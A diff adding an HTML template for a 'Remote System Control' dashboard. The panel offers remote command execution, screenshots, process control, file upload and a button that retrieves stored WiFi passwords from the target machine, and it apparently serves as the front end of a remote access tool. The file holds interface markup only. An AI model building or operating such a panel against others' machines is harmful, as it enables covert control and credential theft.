@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remote System Control</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
+</head>
+<body>
+    <div class="container-fluid">
+        <div class="row">
+            <!-- Sidebar -->
+            <div class="col-md-3 col-lg-2 sidebar bg-purple-900 text-white">
+                <div class="d-flex justify-content-between align-items-center p-3">
+                    <h3 class="m-0">System Control</h3>
+                    <button id="theme-toggle" class="btn btn-sm btn-purple-700">
+                        <i class="bi bi-moon-fill"></i>
+                    </button>
+                </div>
+                
+                <div class="system-info p-3 bg-purple-800 rounded-3 mx-2 mb-3">
+                    <h5 class="text-truncate">{{ system.name }}</h5>
+                    <p class="mb-1"><strong>OS:</strong> {{ system.os }}</p>
+                    <p class="mb-1"><strong>IP:</strong> {{ system.ip }}</p>
+                    <p class="mb-1"><strong>CPU:</strong> {{ system.cpu_cores }} cores</p>
+                    <p class="mb-0"><strong>RAM:</strong> {{ system.ram_gb }} GB</p>
+                </div>
+                
+                <ul class="nav flex-column">
+                    <li class="nav-item">
+                        <a class="nav-link active d-flex align-items-center" href="#" data-section="dashboard">
+                            <i class="bi bi-speedometer2 me-2"></i> Dashboard
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link d-flex align-items-center" href="#" data-section="command">
+                            <i class="bi bi-terminal me-2"></i> Command
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link d-flex align-items-center" href="#" data-section="processes">
+                            <i class="bi bi-list-task me-2"></i> Processes
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link d-flex align-items-center" href="#" data-section="wifi">
+                            <i class="bi bi-wifi me-2"></i> WiFi
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link d-flex align-items-center" href="#" data-section="files">
+                            <i class="bi bi-folder me-2"></i> File Manager
+                        </a>
+                    </li>
+                </ul>
+                
+                <div class="position-absolute bottom-0 start-0 p-3 w-100">
+                    <div class="d-flex align-items-center justify-content-between">
+                        <small class="text-purple-300">Status: <span class="text-success">Online</span></small>
+                        <small class="text-purple-300">{{ system.last_seen.strftime('%H:%M') }}</small>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Main content -->
+            <div class="col-md-9 col-lg-10 main-content ms-auto">
+                <div id="dashboard-section" class="content-section">
+                    <div class="d-flex justify-content-between align-items-center mb-4">
+                        <h2 class="mb-0">System Dashboard</h2>
+                        <div class="badge bg-purple-100 text-purple-800">
+                            {{ 'Admin' if system.is_admin else 'User' }} Privileges
+                        </div>
+                    </div>
+                    
+                    <div class="row g-4">
+                        <div class="col-md-6">
+                            <div class="card border-purple-200 h-100">
+                                <div class="card-header bg-purple-100 border-purple-200">
+                                    <h5 class="mb-0">Quick Actions</h5>
+                                </div>
+                                <div class="card-body d-flex flex-wrap gap-2">
+                                    <button class="btn btn-purple" onclick="takeScreenshot()">
+                                        <i class="bi bi-camera me-1"></i> Screenshot
+                                    </button>
+                                    <button class="btn btn-outline-purple" onclick="getProcesses()">
+                                        <i class="bi bi-arrow-clockwise me-1"></i> Processes
+                                    </button>
+                                    <button class="btn btn-outline-purple" onclick="getWifiPasswords()">
+                                        <i class="bi bi-wifi me-1"></i> WiFi Passwords
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="card border-purple-200 h-100">
+                                <div class="card-header bg-purple-100 border-purple-200">
+                                    <h5 class="mb-0">System Status</h5>
+                                </div>
+                                <div class="card-body">
+                                    <div class="d-flex align-items-center mb-2">
+                                        <i class="bi bi-clock-history text-purple-600 me-2"></i>
+                                        <div>
+                                            <small class="text-muted">Last Seen</small>
+                                            <div id="last-seen">{{ system.last_seen.strftime('%Y-%m-%d %H:%M:%S') }}</div>
+                                        </div>
+                                    </div>
+                                    <div class="d-flex align-items-center mb-2">
+                                        <i class="bi bi-shield-check text-purple-600 me-2"></i>
+                                        <div>
+                                            <small class="text-muted">Security</small>
+                                            <div>Firewall Active</div>
+                                        </div>
+                                    </div>
+                                    <div class="d-flex align-items-center">
+                                        <i class="bi bi-hdd text-purple-600 me-2"></i>
+                                        <div>
+                                            <small class="text-muted">Storage</small>
+                                            <div>256GB / 512GB (50%)</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Stats Row -->
+                        <div class="col-12">
+                            <div class="row g-4">
+                                <div class="col-md-3 col-6">
+                                    <div class="card bg-purple-50 border-purple-100 h-100">
+                                        <div class="card-body text-center">
+                                            <h3 class="text-purple-800">75%</h3>
+                                            <small class="text-muted">CPU Usage</small>
+                                            <div class="progress mt-2" style="height: 4px;">
+                                                <div class="progress-bar bg-purple" style="width: 75%"></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-3 col-6">
+                                    <div class="card bg-purple-50 border-purple-100 h-100">
+                                        <div class="card-body text-center">
+                                            <h3 class="text-purple-800">62%</h3>
+                                            <small class="text-muted">Memory Usage</small>
+                                            <div class="progress mt-2" style="height: 4px;">
+                                                <div class="progress-bar bg-purple" style="width: 62%"></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-3 col-6">
+                                    <div class="card bg-purple-50 border-purple-100 h-100">
+                                        <div class="card-body text-center">
+                                            <h3 class="text-purple-800">42°C</h3>
+                                            <small class="text-muted">CPU Temp</small>
+                                            <div class="progress mt-2" style="height: 4px;">
+                                                <div class="progress-bar bg-purple" style="width: 60%"></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-3 col-6">
+                                    <div class="card bg-purple-50 border-purple-100 h-100">
+                                        <div class="card-body text-center">
+                                            <h3 class="text-purple-800">24</h3>
+                                            <small class="text-muted">Running Processes</small>
+                                            <div class="progress mt-2" style="height: 4px;">
+                                                <div class="progress-bar bg-purple" style="width: 40%"></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div id="command-section" class="content-section" style="display: none;">
+                    <h2 class="mb-4">Command Execution</h2>
+                    <div class="card border-purple-200">
+                        <div class="card-body">
+                            <div class="mb-3">
+                                <label for="command-input" class="form-label">Enter Command:</label>
+                                <div class="input-group">
+                                    <span class="input-group-text bg-purple-100">
+                                        <i class="bi bi-terminal text-purple-600"></i>
+                                    </span>
+                                    <input type="text" class="form-control" id="command-input" placeholder="e.g. dir, ls, ipconfig">
+                                    <button class="btn btn-purple" onclick="executeCommand()">
+                                        <i class="bi bi-send me-1"></i> Execute
+                                    </button>
+                                </div>
+                            </div>
+                            <div>
+                                <label class="form-label">Output:</label>
+                                <pre id="command-output" class="bg-dark text-white p-3 rounded"></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div id="processes-section" class="content-section" style="display: none;">
+                    <div class="d-flex justify-content-between align-items-center mb-4">
+                        <h2 class="mb-0">Process Manager</h2>
+                        <button class="btn btn-purple" onclick="getProcesses()">
+                            <i class="bi bi-arrow-clockwise me-1"></i> Refresh
+                        </button>
+                    </div>
+                    
+                    <div class="card border-purple-200">
+                        <div class="card-body p-0">
+                            <div class="table-responsive">
+                                <table class="table table-hover mb-0">
+                                    <thead class="bg-purple-100">
+                                        <tr>
+                                            <th>PID</th>
+                                            <th>Name</th>
+                                            <th>CPU %</th>
+                                            <th>Memory %</th>
+                                            <th>User</th>
+                                            <th>Actions</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="processes-table">
+                                        <!-- Processes will be loaded here -->
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div id="wifi-section" class="content-section" style="display: none;">
+                    <div class="d-flex justify-content-between align-items-center mb-4">
+                        <h2 class="mb-0">WiFi Networks</h2>
+                        <button class="btn btn-purple" onclick="getWifiPasswords()">
+                            <i class="bi bi-arrow-clockwise me-1"></i> Refresh
+                        </button>
+                    </div>
+                    
+                    <div class="card border-purple-200">
+                        <div class="card-body p-0">
+                            <div class="table-responsive">
+                                <table class="table table-hover mb-0">
+                                    <thead class="bg-purple-100">
+                                        <tr>
+                                            <th>SSID</th>
+                                            <th>Signal</th>
+                                            <th>Security</th>
+                                            <th>Password</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="wifi-table">
+                                        <!-- WiFi networks will be loaded here -->
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div id="files-section" class="content-section" style="display: none;">
+                    <div class="d-flex justify-content-between align-items-center mb-4">
+                        <h2 class="mb-0">File Manager</h2>
+                        <div>
+                            <button class="btn btn-purple" onclick="refreshFiles()">
+                                <i class="bi bi-arrow-clockwise me-1"></i> Refresh
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="card border-purple-200">
+                        <div class="card-body">
+                            <div class="d-flex flex-wrap gap-2 mb-3">
+                                <div class="input-group flex-grow-1" style="max-width: 500px;">
+                                    <span class="input-group-text bg-purple-100">
+                                        <i class="bi bi-folder text-purple-600"></i>
+                                    </span>
+                                    <input type="text" class="form-control" id="current-path" value="">
+                                    <button class="btn btn-outline-purple" onclick="navigateUp()">
+                                        <i class="bi bi-arrow-up"></i>
+                                    </button>
+                                </div>
+                                
+                                <div class="d-flex gap-2">
+                                    <input type="file" id="file-upload" style="display: none;">
+                                    <button class="btn btn-outline-purple" onclick="document.getElementById('file-upload').click()">
+                                        <i class="bi bi-upload me-1"></i> Upload
+                                    </button>
+                                    <button class="btn btn-purple" onclick="createFolder()">
+                                        <i class="bi bi-folder-plus me-1"></i> New Folder
+                                    </button>
+                                </div>
+                            </div>
+                            
+                            <div class="table-responsive">
+                                <table class="table table-hover">
+                                    <thead class="bg-purple-100">
+                                        <tr>
+                                            <th>Name</th>
+                                            <th>Type</th>
+                                            <th>Size</th>
+                                            <th>Modified</th>
+                                            <th>Actions</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="files-table">
+                                        <!-- Files will be loaded here -->
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal for folder creation -->
+    <div class="modal fade" id="folderModal" tabindex="-1">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header bg-purple-100">
+                    <h5 class="modal-title">Create New Folder</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <input type="text" class="form-control" id="folder-name" placeholder="Folder name">
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-outline-purple" data-bs-dismiss="modal">Cancel</button>
+                    <button type="button" class="btn btn-purple" onclick="confirmCreateFolder()">Create</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="/static/js/script.js"></script>
+</body>
+</html>
